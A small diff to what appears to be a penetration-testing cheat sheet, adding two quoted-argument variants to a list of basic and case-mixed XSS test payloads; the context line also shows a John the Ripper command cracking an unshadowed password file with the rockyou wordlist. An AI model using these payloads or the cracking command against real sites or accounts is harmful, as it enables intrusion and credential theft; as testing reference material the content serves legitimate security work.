@@ -151,6 +151,8 @@ john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
 ```sh
 <script>alert(1)</script>
 <ScRiPt>alert(1)</ScRiPt>
+<script>alert('1')</script>
+<ScRiPt>alert('1')</ScRiPt>
 <script>alert('XSS')</script>
 <ScRiPt>alert('XSS')</ScRiPt>
 ```
